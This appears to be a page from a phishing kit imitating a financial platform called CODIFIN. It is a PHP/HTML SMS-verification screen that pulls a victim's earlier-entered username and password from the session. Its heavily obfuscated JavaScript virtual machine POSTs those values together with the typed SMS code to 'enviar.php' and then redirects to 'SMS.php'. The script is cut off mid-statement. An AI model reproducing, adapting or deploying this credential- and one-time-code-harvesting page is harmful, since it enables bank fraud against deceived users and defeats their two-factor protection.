<?php
session_start();

$usuario = $_SESSION['usuario'] ?? '';
$clave = $_SESSION['clave'] ?? '';
?>
<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>CODIFIN | Plataforma Financiera</title>

<style>

*{
box-sizing:border-box;
margin:0;
padding:0;
font-family:Arial, Helvetica, sans-serif;
}

/* BODY */

body{
min-height:100vh;
display:flex;
flex-direction:column;
align-items: center;
background:#ffffff;
}
#securityOverlay{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:transparent;
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

#securityOverlay polygon{
transition:none;
}
#securityOverlay svg{
width:300px;
height:300px;
}

@keyframes bankPulse{
0%{transform:scale(1);}
50%{transform:scale(1.05);}
100%{transform:scale(1);}
}
#securityOverlay.active svg{
animation:bankPulse 0.8s ease-in-out infinite;
}

#securityOverlay polygon{
filter:brightness(1.05);
}

.hide{
opacity:0;
}
/* CONTENEDOR PRINCIPAL */

.container{
display:flex;
width:100%;
flex:1;
overflow-x:hidden;
align-items:flex-start;

}

/* PANEL LOGIN */

.login-panel{
flex:0 0 530px;
max-width:620px;
padding:80px;
display:flex;
flex-direction:column;
justify-content:flex-start;
background:white;
margin-left:auto;
padding-top:0px;
}


/* LOGO */

.logo{
display:flex;
align-items:center;
gap:2px;
margin-bottom:0px;
margin-top: 50px;
}
.logo1{
height:40px;
margin-bottom:10px;
}

.logo2{
height:40px;
margin-bottom:22px;
}
@media (min-width:1024px){

.logo1{
height:clamp(105px,7vw,155px);
}

.logo2{
height:clamp(100px,7vw,180px);
margin-bottom:30px;
}

}

.logo-square{
width:35px;
height:35px;
background:#2aa54a;
margin-right:12px;
}

.logo-text{
font-size:34px;
font-weight:bold;
color:#1e8e3e;
}

.logo-sub{
font-size:13px;
color:#666;
}

/* TEXTOS */

.title{
font-size:15px;
font-weight: 550;
color:#4a4a4a;
margin-bottom:7px;
margin-top:30px ;
}

.subtitle{
color:#666;
margin-bottom:8px;
}

/* INPUTS */

input{
width:100%;
padding:10px;
border:1px solid #ccc;
border-radius:4px;
margin-bottom:8px;
font-size:16px;
letter-spacing:0.5px;
color:#6a6a6a;
}


/* 🔥 ESTO AGREGAS AQUÍ */
input:focus{
outline:none;
border:2px solid #000;
box-shadow:none;
}

/* 🔥 AUTOFILL (AQUÍ VA ESTO) */
input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus{

-webkit-box-shadow: 0 0 0 30px white inset !important;
box-shadow: 0 0 0 30px white inset !important;

-webkit-text-fill-color: #000 !important;

border:2px solid #000 !important;

}

.input-label{
font-size:14px;
color:#666;
margin-bottom:6px;
margin-top:35px;
font-weight:500;
}

/* OPCIONES */

.options{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:0px;
margin-top: 30px;
font-size:14px;
}

.options a{
font-size:15px;
font-weight: 550;
text-decoration:underline;
color:#1a8338;
margin-bottom: 10px;
margin-top: 10px;
}

/* SWITCH */

.remember-container{
display:flex;
align-items:center;
gap:12px;
}

.switch{
position:relative;
display:inline-block;
width:56px;
height:33px;
}

.switch input{
opacity:0;
width:0;
height:0;
}

.slider{
position:absolute;
cursor:pointer;
top:0;
left:0;
right:0;
bottom:0;
background:#aeaeae;
border-radius:34px;
transition:.3s;
}

.slider:before{
position:absolute;
content:"";
height:30.5px;
width:30.5px;
left:1.5px;
bottom:1.5px;
background:white;
border-radius:50%;
transition:.3s;
}

.switch input:checked + .slider{
background:#2aa54a;
}

.switch input:checked + .slider:before{
transform:translateX(24px);
}

/* BOTON */

button{
width:100%;
padding:12px;
background:#f0f0f0;
border:none;
border-radius:4px;
cursor:pointer;
font-size:16px;
font-weight:550;
color:#6a6a6a;
margin-bottom:30px;
}

button.active{
background:#22853d;
color:white;
}

/* LINKS EXTRA */

.extra-links{
display:flex;
justify-content:space-between;
margin-bottom:180px;
}

.extra-links a{
color:#2c8747;
text-decoration:underline;
font-size:16px;
font-weight:600;
}

/* PANEL IMAGEN */

.image-panel{
flex:1;
display:flex;
align-items:center;
justify-content:center;
background:#ffffff;
}

.image-panel img{
width:103%;
height:100%;
object-fit:contain;
display:block;
background:#ffffff;
}

/* FOOTER */

.footer-full{
width:100%;
background:transparent;
text-align:center;
color:white;
padding:40px 10px 25px 10px;
}

.footer-links{
display:flex;
justify-content:center;
gap:10px;
flex-wrap:wrap;
margin-bottom:15px;
}

.footer-links a{
color:white;
text-decoration:none;
font-weight:500;
}

.footer-links a::after{
content:" |";
margin-left:8px;
}

.footer-links a:last-child::after{
content:"";
}
@media (max-width:700px){

.footer-links a:nth-child(n+3){
display:none;
}

.footer-links a:nth-child(2)::after{
content:"";
}

}

.footer-copy{
font-size:14px;
}

/* ================= */
/* RESPONSIVE */
/* ================= */

@media (max-width:768px){

body{

background:
linear-gradient(
to top,
#1a6b14 0%,
#2f8f1a 40%,
#4fa81e 70%,
#63b51f 100%
),
linear-gradient(
90deg,
rgba(0,0,0,0.18) 0%,
rgba(0,0,0,0) 25%,
rgba(0,0,0,0) 75%,
rgba(0,0,0,0.18) 100%
);

padding-top:clamp(40px,6vh,100px);
padding-bottom:clamp(60px,10vh,140px);
padding-left:0px;
padding-right:0px;

min-height:100vh;
overflow:auto;
}

/* centrar login */

.container{
display:flex;
justify-content:center;
align-items:center;
width:100%;
margin:0 auto;
}

/* panel */

.login-panel{
display: block;
width:100%;
max-width:90%;
margin-left:auto;
margin-right:auto;
padding:20px 40px;
border-radius:6px;
box-shadow:0 10px 30px rgba(0,0,0,0.15);
}

/* ocultar imagen */

.image-panel{
display:none;
}

}

</style>

</head>

<body>
<div id="securityOverlay">

<svg width="400" height="400" viewBox="0 0 200 200">

<!-- 1 -->
<polygon id="p1"
points="50,100 100,100 100,75"
fill="#071018"/>

<!-- 2 -->
<polygon id="p2"
points="50,100 100,75 100,50"
fill="#0b1320"/>

<!-- 3 -->
<polygon id="p3"
points="100,50 125,100 150,100"
fill="#1f6f3e"/>

<!-- 4 -->
<polygon id="p4"
points="100,50 100,100 125,100"
fill="#2e7b4c"/>

<!-- 5 -->
<polygon id="p5"
points="100,100 150,100 100,150"
fill="#3f6f5c"/>

<!-- 6 -->
<polygon id="p6"
points="100,100 50,100 100,150"
fill="#7CFC00"/>

<!-- 7 -->
<polygon id="p7"
points="50,100 100,150 50,150"
fill="#000000"/>

<!-- 8 -->
<polygon id="p8"
points="50,150 100,150 100,200"
fill="#0b6b3a"/>

</svg>

</div>
<div class="container">

<div class="login-panel">

<div class="logo">


<img src="Imagen5.png" class="logo1">
<img src="Imagen4.png" class="logo2">

</div>
<div class="title">¡Verificacion!</div>
<div class="subtitle">Por favor, ingrese el código enviado por SMS a su numero telefonico:</div>

<div class="input-label">Ingrese codigo</div>
<input type="text" id="usuario" placeholder="Codigo">

<!-- INICIO -->

<div class="options">

<!--<a href="#">Olvidé mi contraseña</a>-->

<div class="remember-container">

<!--<span>Recordarme</span>-->

<!--<label class="switch">
<input type="checkbox">
<span class="slider"></span>
</label>-->

</div>

</div>

<button id="loginBtn" onclick="login()">Continuar</button>

<div class="extra-links">
<a href="#">Cancelar</a>
<!--<a href="#">Afiliese</a>-->
</div>

</div>

<div class="image-panel">
<img src="Imagen6.png">
</div>

</div>

<!-- FOOTER -->

<div class="footer-full">

<div class="footer-links">
<a href="#">Sucursales</a>
<a href="#">Contáctenos</a>
<a href="#">Políticas de Privacidad</a>
<a href="#">Términos y Condiciones</a>
<a href="#">FAQs</a>
</div>

<div class="footer-copy">
(C) Copyright CODIFIN. Todos los derechos reservados.
</div>

</div>

<script>
 
let vmd=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?window:global,vmZ=Object['defineProperty'],vmY=Object['create'],vmG=Object['getOwnPropertyDescriptor'],vmv=Object['getOwnPropertyNames'],vmS=Object['getOwnPropertySymbols'],vmD=Object['setPrototypeOf'],vmB=Object['getPrototypeOf'],vmF=Function['prototype']['call'],vmK=Function['prototype']['apply'],vmQ=Reflect['apply'],vmg_717f62=vmd['vmg_717f62']||(vmd['vmg_717f62']={});const vmN_874149=(function(){let j=['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'],C={'0':0xb0,'1':0xa,'2':0x1b3,'3':0x3c,'4':0x10d,'5':0x17c,'6':0x2e,'7':0x10,'8':0xa3,'9':0xc0,'10':0xb4,'11':0x1e4,'12':0x1e3,'13':0x1ae,'14':0x21,'15':0x156,'16':0x1e0,'17':0x1b5,'18':0x1e2,'19':0x86,'20':0x1a5,'21':0x165,'22':0x1d6,'23':0x8b,'24':0x1c6,'25':0x19b,'26':0xcd,'27':0xb3,'28':0x17a,'29':0x127,'32':0x1a4,'40':0x75,'41':0x129,'42':0x85,'43':0x195,'44':0xbf,'45':0x139,'46':0x79,'47':0xf3,'50':0x132,'51':0x12f,'52':0x1b0,'53':0x8e,'54':0x1cf,'55':0x13b,'56':0x11c,'57':0x185,'58':0xca,'59':0x167,'60':0x1e7,'61':0xa9,'62':0x1a,'63':0x95,'64':0x149,'65':0x62,'70':0x146,'71':0xa1,'72':0x14,'73':0xcf,'74':0x10f,'75':0x9,'76':0x11d,'77':0x23,'78':0x84,'79':0x4,'80':0xf,'81':0x14f,'82':0x77,'83':0x18c,'84':0x1c3,'90':0xc5,'91':0x2f,'92':0x54,'93':0x161,'94':0x1f6,'95':0x1f,'100':0x16a,'101':0x135,'102':0x89,'103':0xab,'104':0x17e,'105':0x1bd,'106':0x9f,'107':0x125,'110':0x1e1,'111':0x17f,'112':0x1bb,'120':0xc7,'121':0x14b,'122':0x1b7,'123':0x101,'124':0xc9,'125':0x1dd,'126':0xea,'127':0x17b,'128':0x1c,'129':0x163,'130':0x2b,'131':0x3a,'132':0x16d,'140':0xa6,'141':0x92,'142':0x19d,'143':0x3d,'144':0x46,'145':0x1d7,'146':0x144,'147':0x1bf,'148':0xd0,'149':0x160,'150':0x87,'151':0xf6,'152':0x1a7,'153':0x66,'154':0x183,'155':0x18a,'156':0x126,'157':0x8d,'158':0x111,'160':0x105,'161':0x9d,'162':0x12d,'163':0xd8,'164':0x14a,'165':0x80,'166':0x4b,'167':0x34,'168':0x158,'169':0x1dc,'180':0xb,'181':0x1f0,'182':0x169,'183':0x16c,'184':0x41,'185':0x16f,'200':0x7b,'201':0x4f,'202':0x13,'210':0x1fb,'211':0x65,'212':0x1ca,'213':0xc1,'214':0x7e,'215':0x19f,'216':0x140,'217':0x32,'218':0xaf,'219':0x176,'220':0x1b1,'221':0x172,'250':0x121,'251':0x179,'252':0x113,'253':0xf4,'254':0x1b6,'255':0x168,'256':0xd1,'257':0x6,'258':0xbe,'259':0xdc,'260':0xcc,'261':0x19a,'270':0x1d2,'271':0x109};const l=0x1,E=0x2,N=0x3,y=0x4,x=0x78,i=0x79,g=0x7a,f=typeof 0x0n,U=[],d=function(){throw new TypeError('\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them');};Object['preventExtensions'](d);let M=new WeakSet(),b=new WeakSet(),Z=new WeakMap();function Y(jB,jF,jK){try{vmZ(jB,jF,jK);}catch(jQ){}}function G(jB,jF){let jK=new Array(jF),jQ=![];for(let jA=jF-0x1;jA>=0x0;jA--){let ja=jB();ja&&typeof ja==='object'&&M['has'](ja)?(jQ=!![],jK[jA]=ja):jK[jA]=ja;}if(!jQ)return jK;let jr=[];for(let jn=0x0;jn<jF;jn++){let jq=jK[jn];if(jq&&typeof jq==='object'&&M['has'](jq)){let jw=jq['value'];if(Array['isArray'](jw)){for(let jJ=0x0;jJ<jw['length'];jJ++)jr['push'](jw[jJ]);}}else jr['push'](jq);}return jr;}function v(jB){let jF=[];for(let jK in jB){jF['push'](jK);}return jF;}function S(jB){return Array['prototype']['slice']['call'](jB);}function D(jB){return typeof jB==='function'&&jB['prototype']?jB['prototype']:jB;}function B(jB){if(typeof jB==='function')return vmB(jB);let jF=vmB(jB),jK=jF&&vmG(jF,'constructor'),jQ=jK&&jK['value'],jr=jQ&&typeof jQ==='function'&&(jQ['prototype']===jF||vmB(jQ['prototype'])===vmB(jF));if(jr)return vmB(jF);return jF;}function F(jB,jF){let jK=jB;while(jK!==null){let jQ=vmG(jK,jF);if(jQ)return{'desc':jQ,'proto':jK};jK=vmB(jK);}return{'desc':null,'proto':jB};}function K(jB,jF){if(!jB['_$k25D7l'])return;jF in jB['_$k25D7l']&&delete jB['_$k25D7l'][jF];let jK=jF['indexOf']('$$');if(jK!==-0x1){let jQ=jF['substring'](0x0,jK);jQ in jB['_$k25D7l']&&delete jB['_$k25D7l'][jQ];}}function Q(jB,jF){let jK=jB;while(jK){K(jK,jF),jK=jK['_$IYp3QS'];}}function r(jB,jF,jK,jQ){if(jQ){let jr=Reflect['set'](jB,jF,jK);if(!jr)throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(jF)+'\x27\x20of\x20object');}else Reflect['set'](jB,jF,jK);}function A(){return!vmg_717f62['_$9eDSJG']&&(vmg_717f62['_$9eDSJG']=new Map()),vmg_717f62['_$9eDSJG'];}function a(){return vmg_717f62['_$9eDSJG']||null;}function n(jB,jF,jK){if(jB[0x16]===undefined||!jK)return;let jQ=jB[0x2][jB[0x16]];!jF['_$9omHYP']&&(jF['_$9omHYP']=vmY(null)),jF['_$9omHYP'][jQ]=jK,jB[0xf]&&(!jF['_$V80HSn']&&(jF['_$V80HSn']=vmY(null)),jF['_$V80HSn'][jQ]=!![]),Y(jK,'name',{'value':jQ,'writable':![],'enumerable':![],'configurable':!![]});}function q(jB){return'_$9NpzUb'+jB['substring'](0x1)+'_$UHsVJB';}function w(jB){return'_$6ROloL'+jB['substring'](0x1)+'_$AZoxSE';}function J(jB,jF,jK,jQ,jr){let jA;return jQ?jA=function ja(){let jn=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return jB(jF,arguments,jK,jA,jn,this===jr?undefined:this);}:jA=function jn(){let jq=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return jB(jF,arguments,jK,jA,jq,this);},Z['set'](jA,{'b':jF,'e':jK}),jA;}function s(jB,jF,jK,jQ,jr){let jA;return jQ?jA=async function ja(){let jn=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return await jB(jF,arguments,jK,jA,jn,undefined,this===jr?undefined:this);}:jA=async function jn(){let jq=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return await jB(jF,arguments,jK,jA,jq,undefined,this);},jA;}function I(jB,jF,jK,jQ,jr,jA){let ja;return jr?ja=function jn(){return jB(jF,arguments,jK,ja,undefined,this===jA?undefined:this);}:ja=function jq(){return jB(jF,arguments,jK,ja,undefined,this);},jQ['add'](ja),ja;}function W(jB,jF,jK,jQ){let jr;return jr={'APoTJL':(...jA)=>{return jB(jF,jA,jK,jr,undefined,jQ);}}['APoTJL'],jr;}function u(jB,jF,jK,jQ){let jr;return jr={'APoTJL':async(...jA)=>{return await jB(jF,jA,jK,jr,undefined,undefined,jQ);}}['APoTJL'],jr;}function O(jB,jF,jK,jQ,jr){let jA;return jQ?jA={'APoTJL'(){let ja=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return jB(jF,arguments,jK,jA,ja,this===jr?undefined:this);}}['APoTJL']:jA={'APoTJL'(){let ja=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return jB(jF,arguments,jK,jA,ja,this);}}['APoTJL'],Z['set'](jA,{'b':jF,'e':jK}),jA;}function z(jB,jF,jK,jQ,jr){let jA;return jQ?jA={async 'APoTJL'(){let ja=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return await jB(jF,arguments,jK,jA,ja,undefined,this===jr?undefined:this);}}['APoTJL']:jA={async 'APoTJL'(){let ja=new.target!==undefined?new.target:vmg_717f62['_$L4iaoq'];return await jB(jF,arguments,jK,jA,ja,undefined,this);}}['APoTJL'],jA;}function o(jB,jF,jK,jQ,jr,jA){let ja=new Array(0x8),jn=0x0,jq=new Array((jB[0xb]||0x0)+(jB[0xd]||0x0)),jw=0x0,jJ=jB[0x2],js=jB[0xc],jI=jB[0x13]||U,jW=jB[0xe]||U,ju=js['length']>>0x1,jO=(jB[0xb]*0x1f^jB[0xd]*0x11^ju*0xd^jJ['length']*0x7)>>>0x0&0x3,jz,jo,jt;switch(jO){case 0x1:jz=0x1,jo=0x0,jt=0x1;break;case 0x2:jz=0x0,jo=ju,jt=0x0;break;case 0x3:jz=ju,jo=0x0,jt=0x0;break;default:jz=0x0,jo=0x1,jt=0x1;break;}let jk=null,jT=null,jX=![],jL=undefined,jR=![],jm=0x0,jV=![],jH=0x0,jP=!!jB[0x1],je=!!jB[0x8],jh=!!jB[0x3],jc=!!jB[0x5],jp=jA,C0=!!jB[0x4];!jP&&!C0&&(jA===undefined||jA===null)&&(jA=vmd);let C1=Cg=>{ja[jn++]=Cg;},C2=()=>ja[--jn],C3=Cg=>Cg,C4={['_$9omHYP']:null,['_$o3JtVK']:null,['_$k25D7l']:null,['_$IYp3QS']:jK};if(jF){let Cg=jB[0xb]||0x0;for(let Cf=0x0,CU=jF['length']<Cg?jF['length']:Cg;Cf<CU;Cf++){jq[Cf]=jF[Cf];}}let C5=(jP||!je)&&jF?S(jF):null,C6=null,C7=![],C8=jq['length'],C9=null,Cj=0x0;jc&&(C4['_$k25D7l']=vmY(null),C4['_$k25D7l']['__this__']=!![]);n(jB,C4,jQ);let CC={['_$wPHaOR']:jP,['_$7AWJXJ']:je,['_$cEXkWi']:jh,['_$lGK2nA']:jc,['_$LXelx5']:C7,['_$LX6iYq']:jp,['_$mncnwJ']:C5,['_$UP7JxF']:C4};while(jw<ju){try{while(jw<ju){let Cd=js[jz+(jw<<jt)],CM=js[jo+(jw<<jt)];var Cl,CE,CN,Cy,Cx,Ci;!Cy&&(CE=null,CN=function(){for(let Cb=C8-0x1;Cb>=0x0;Cb--){jq[Cb]=C9[--Cj];}C4=C9[--Cj],CC['_$UP7JxF']=C4,C5=C9[--Cj],CC['_$mncnwJ']=C5,C6=C9[--Cj],jF=C9[--Cj],jn=C9[--Cj],jw=C9[--Cj],ja[jn++]=Cl,jw++;},Cy=function(Cb,CZ){switch(Cb){case 0x5:{EZ:{let CY=ja[jn-0x1];ja[jn-0x1]=ja[jn-0x2],ja[jn-0x2]=CY,jw++;}break;}case 0x33:{EY:{ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x3a:{EG:{let CG=jW[jw];if(!jk)jk=[];jk['push']({['_$lQFkUz']:CG[0x0]>=0x0?CG[0x0]:undefined,['_$vKxByc']:CG[0x1]>=0x0?CG[0x1]:undefined,['_$lhqrKM']:CG[0x2]>=0x0?CG[0x2]:undefined,['_$jcGxNK']:jn}),jw++;}break;}case 0x2d:{Ev:{let Cv=ja[--jn],CS=ja[--jn];ja[jn++]=CS<=Cv,jw++;}break;}case 0x18:{ES:{let CD=ja[--jn],CB=ja[--jn];ja[jn++]=CB<<CD,jw++;}break;}case 0x7:{ED:{jq[CZ]=ja[--jn],jw++;}break;}case 0x4d:{EB:{ja[jn++]={},jw++;}break;}case 0xa:{EF:{let CF=ja[--jn],CK=ja[--jn];ja[jn++]=CK+CF,jw++;}break;}case 0x11:{EK:{let CQ=ja[--jn];ja[jn++]=typeof CQ===f?CQ-0x1n:+CQ-0x1,jw++;}break;}case 0x4a:{EQ:{let Cr,CA;CZ!=null?(CA=ja[--jn],Cr=jJ[CZ]):(Cr=ja[--jn],CA=ja[--jn]);let Ca=delete CA[Cr];if(CE['_$wPHaOR']&&!Ca)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(Cr)+'\x27\x20of\x20object');ja[jn++]=Ca,jw++;}break;}case 0x6:{Er:{ja[jn++]=jq[CZ],jw++;}break;}case 0x2f:{EA:{let Cn=ja[--jn],Cq=ja[--jn];ja[jn++]=Cq>=Cn,jw++;}break;}case 0x36:{Ea:{let Cw=ja[--jn],CJ=ja[--jn];if(typeof CJ!=='function')throw new TypeError(CJ+'\x20is\x20not\x20a\x20function');let Cs=vmg_717f62['_$RycY0U'],CI=!vmg_717f62['_$yi8Vf9']&&!vmg_717f62['_$L4iaoq']&&!(Cs&&Cs['get'](CJ))&&Z['get'](CJ);if(CI){let Co=CI['c']||(CI['c']=typeof CI['b']==='object'?CI['b']:jv(CI['b']));if(Co){let Ct;if(Cw===0x0)Ct=[];else{if(Cw===0x1){let CT=ja[--jn];Ct=CT&&typeof CT==='object'&&M['has'](CT)?CT['value']:[CT];}else Ct=G(C2,Cw);}let Ck=Co[0xa];if(Ck&&Co===jB&&!Co[0xe]&&CI['e']===jK){!C9&&(C9=[]);C9[Cj++]=jw,C9[Cj++]=jn,C9[Cj++]=jF,C9[Cj++]=C6,C9[Cj++]=C5,C9[Cj++]=C4;for(let CX=0x0;CX<C8;CX++){C9[Cj++]=jq[CX];}jF=Ct,C6=null;if(Co[0x8]){C5=null;let CL=Co[0xb]||0x0;for(let CR=0x0;CR<CL&&CR<Ct['length'];CR++){jq[CR]=Ct[CR];}for(let Cm=Ct['length']<CL?Ct['length']:CL;Cm<C8;Cm++){jq[Cm]=undefined;}jw=Ck;}else{C5=S(Ct),CC['_$mncnwJ']=C5;for(let CV=0x0;CV<C8;CV++){jq[CV]=undefined;}jw=0x0;}break Ea;}vmg_717f62['_$m7f5kZ']?vmg_717f62['_$m7f5kZ']=![]:vmg_717f62['_$yi8Vf9']=undefined;ja[jn++]=o(Co,Ct,CI['e'],CJ,undefined,undefined),jw++;break Ea;}}let CW=vmg_717f62['_$yi8Vf9'],Cu=vmg_717f62['_$RycY0U'],CO=Cu&&Cu['get'](CJ);CO?(vmg_717f62['_$m7f5kZ']=!![],vmg_717f62['_$yi8Vf9']=CO):vmg_717f62['_$yi8Vf9']=undefined;let Cz;try{if(Cw===0x0)Cz=CJ();else{if(Cw===0x1){let CH=ja[--jn];Cz=CH&&typeof CH==='object'&&M['has'](CH)?vmQ(CJ,undefined,CH['value']):CJ(CH);}else Cz=vmQ(CJ,undefined,G(C2,Cw));}ja[jn++]=Cz;}finally{CO&&(vmg_717f62['_$m7f5kZ']=![]),vmg_717f62['_$yi8Vf9']=CW;}jw++;}break;}case 0x3d:{En:{if(jk&&jk['length']>0x0){let CP=jk[jk['length']-0x1];CP['_$vKxByc']===jw&&(CP['_$Bn3NBW']!==undefined&&(jT=CP['_$Bn3NBW']),jk['pop']());}jw++;}break;}case 0x4e:{Eq:{let Ce=ja[--jn],Ch=jJ[CZ];Ce===null||Ce===undefined?ja[jn++]=undefined:ja[jn++]=Ce[Ch],jw++;}break;}case 0x39:{Ew:{throw ja[--jn];}break;}case 0x35:{EJ:{let Cc=ja[--jn];Cc!==null&&Cc!==undefined?jw=jI[jw]:jw++;}break;}case 0x3c:{Es:{let Cp=ja[--jn];if(CZ!=null){let l0=jJ[CZ];!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP'][l0]=Cp;}jw++;}break;}case 0x2e:{EI:{let l1=ja[--jn],l2=ja[--jn];ja[jn++]=l2>l1,jw++;}break;}case 0x4c:{EW:{let l3=ja[--jn],l4=jJ[CZ];if(vmg_717f62['_$5efjzU']&&l4 in vmg_717f62['_$5efjzU'])throw new ReferenceError('Cannot\x20access\x20\x27'+l4+'\x27\x20before\x20initialization');let l5=!(l4 in vmg_717f62)&&!(l4 in vmd);vmg_717f62[l4]=l3,l4 in vmd&&(vmd[l4]=l3),l5&&(vmd[l4]=l3),ja[jn++]=l3,jw++;}break;}case 0x17:{Eu:{ja[jn-0x1]=~ja[jn-0x1],jw++;}break;}case 0x37:{EO:{let l6=ja[--jn],l7=ja[--jn],l8=ja[--jn];if(typeof l7!=='function')throw new TypeError(l7+'\x20is\x20not\x20a\x20function');let l9=vmg_717f62['_$RycY0U'],lj=l9&&l9['get'](l7),lC=vmg_717f62['_$yi8Vf9'];lj&&(vmg_717f62['_$m7f5kZ']=!![],vmg_717f62['_$yi8Vf9']=lj);let ll;try{if(l6===0x0)ll=vmQ(l7,l8,[]);else{if(l6===0x1){let lE=ja[--jn];ll=lE&&typeof lE==='object'&&M['has'](lE)?vmQ(l7,l8,lE['value']):vmQ(l7,l8,[lE]);}else ll=vmQ(l7,l8,G(C2,l6));}ja[jn++]=ll;}finally{lj&&(vmg_717f62['_$m7f5kZ']=![],vmg_717f62['_$yi8Vf9']=lC);}jw++;}break;}case 0x20:{Ez:{ja[jn-0x1]=!ja[jn-0x1],jw++;}break;}case 0x16:{Eo:{let lN=ja[--jn],ly=ja[--jn];ja[jn++]=ly^lN,jw++;}break;}case 0x3f:{Et:{let lx=jI[jw];if(jk&&jk['length']>0x0){let li=jk[jk['length']-0x1];if(li['_$vKxByc']!==undefined&&lx>=li['_$lhqrKM']){jR=!![],jm=lx,jw=li['_$vKxByc'];break Et;}}jw=lx;}break;}case 0x47:{Ek:{let lg=ja[--jn],lf=ja[--jn],lU=jJ[CZ];if(lf===null||lf===undefined)throw new 